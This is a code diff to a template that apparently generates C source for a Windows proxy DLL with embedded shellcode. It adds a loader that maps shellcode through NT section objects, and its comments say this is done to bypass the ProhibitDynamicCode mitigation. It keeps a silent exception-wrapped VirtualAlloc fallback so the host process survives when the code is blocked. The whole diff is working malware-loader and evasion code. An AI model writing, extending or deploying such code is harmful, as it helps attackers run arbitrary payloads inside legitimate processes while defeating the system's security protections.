@@ -33,6 +33,14 @@ _C_TEMPLATE = """\
  */
 #include <windows.h>
 
+typedef NTSTATUS (NTAPI *_NtCreateSection_t)(
+    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+typedef NTSTATUS (NTAPI *_NtMapViewOfSection_t)(
+    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
+    PSIZE_T, DWORD, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *_NtUnmapViewOfSection_t)(HANDLE, PVOID);
+typedef NTSTATUS (NTAPI *_NtClose_t)(HANDLE);
+
 /* shellcode */
 static const unsigned char _sc[] = {{
 {shellcode_bytes}
@@ -44,18 +52,90 @@ static const unsigned char _sc[] = {{
  */
 extern void *proxy_fns[];
 
+/*
+ * exec_via_section – execute shellcode by mapping a section object.
+ * Section-backed executable memory is not subject to ProcessDynamicCodePolicy
+ * (ProhibitDynamicCode) the way VirtualAlloc PAGE_EXECUTE_READWRITE is.
+ * Returns TRUE on success.
+ */
+static BOOL _exec_via_section(void)
+{{
+    HMODULE hNt = GetModuleHandleA("ntdll.dll");
+    if (!hNt) return FALSE;
+
+    _NtCreateSection_t      pNtCreateSection      =
+        (_NtCreateSection_t)     GetProcAddress(hNt, "NtCreateSection");
+    _NtMapViewOfSection_t   pNtMapViewOfSection   =
+        (_NtMapViewOfSection_t)  GetProcAddress(hNt, "NtMapViewOfSection");
+    _NtUnmapViewOfSection_t pNtUnmapViewOfSection =
+        (_NtUnmapViewOfSection_t)GetProcAddress(hNt, "NtUnmapViewOfSection");
+    _NtClose_t              pNtClose              =
+        (_NtClose_t)             GetProcAddress(hNt, "NtClose");
+
+    if (!pNtCreateSection || !pNtMapViewOfSection ||
+        !pNtUnmapViewOfSection || !pNtClose)
+        return FALSE;
+
+    LARGE_INTEGER sz;
+    sz.QuadPart = (LONGLONG)sizeof(_sc);
+
+    HANDLE hSection = NULL;
+    /* SEC_COMMIT | PAGE_EXECUTE_READWRITE */
+    NTSTATUS st = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
+                                   &sz, PAGE_EXECUTE_READWRITE, 0x8000000, NULL);
+    if (st != 0 || !hSection) return FALSE;
+
+    /* Map a RW view to copy shellcode in */
+    PVOID  rwView  = NULL;
+    SIZE_T viewSz  = 0;
+    st = pNtMapViewOfSection(hSection, GetCurrentProcess(),
+                             &rwView, 0, 0, NULL, &viewSz,
+                             2 /* ViewUnmap */, 0, PAGE_READWRITE);
+    if (st != 0) {{ pNtClose(hSection); return FALSE; }}
+
+    for (SIZE_T i = 0; i < sizeof(_sc); i++)
+        ((unsigned char *)rwView)[i] = _sc[i];
+
+    pNtUnmapViewOfSection(GetCurrentProcess(), rwView);
+
+    /* Map a separate RX view to execute from */
+    PVOID  rxView  = NULL;
+    SIZE_T rxSz    = 0;
+    st = pNtMapViewOfSection(hSection, GetCurrentProcess(),
+                             &rxView, 0, 0, NULL, &rxSz,
+                             2 /* ViewUnmap */, 0, PAGE_EXECUTE_READ);
+    pNtClose(hSection);
+    if (st != 0) return FALSE;
+
+    ((void (*)(void))rxView)();
+    pNtUnmapViewOfSection(GetCurrentProcess(), rxView);
+    return TRUE;
+}}
+
 /* shellcode execution thread */
 static DWORD WINAPI _ScThread(LPVOID p)
 {{
     (void)p;
-    LPVOID m = VirtualAlloc(NULL, sizeof(_sc),
-                            MEM_COMMIT | MEM_RESERVE,
-                            PAGE_EXECUTE_READWRITE);
-    if (!m) return 1;
-    for (SIZE_T i = 0; i < sizeof(_sc); i++)
-        ((unsigned char *)m)[i] = _sc[i];
-    ((void (*)(void))m)();
-    VirtualFree(m, 0, MEM_RELEASE);
+
+    /* Primary path: section-mapped memory (bypasses ProhibitDynamicCode) */
+    if (_exec_via_section()) return 0;
+
+    /* Fallback: classic VirtualAlloc RWX – wrapped in SEH so a policy
+       violation (STATUS_DYNAMIC_CODE_BLOCKED / 0xC0000906) does not
+       propagate as an unhandled exception and crash the host process. */
+    __try {{
+        LPVOID m = VirtualAlloc(NULL, sizeof(_sc),
+                                MEM_COMMIT | MEM_RESERVE,
+                                PAGE_EXECUTE_READWRITE);
+        if (!m) return 1;
+        for (SIZE_T i = 0; i < sizeof(_sc); i++)
+            ((unsigned char *)m)[i] = _sc[i];
+        ((void (*)(void))m)();
+        VirtualFree(m, 0, MEM_RELEASE);
+    }}
+    __except(EXCEPTION_EXECUTE_HANDLER) {{
+        /* blocked by policy – fail silently so the host process survives */
+    }}
     return 0;
 }}
 
